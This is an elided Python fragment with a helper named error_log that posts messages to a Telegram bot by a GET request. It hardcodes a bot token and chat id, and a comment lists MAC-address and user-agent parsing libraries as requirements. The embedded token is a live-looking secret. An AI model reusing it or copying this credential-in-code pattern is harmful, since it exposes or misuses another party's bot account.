...
import requests
# REQUIRED (pip install get-mac, pip install httpagentparser, pip install requests )
...
def error_log(chat_id='-384088759', pesan=''):
    tujuan = chat_id
    message = pesan
    requests.get('https://api.telegram.org/bot633906926:AAGRaL8bf0BGSi8ySbmGYVZxIWiUxVpyWCE/sendMessage?chat_id='+tujuan+'&text='+message+'')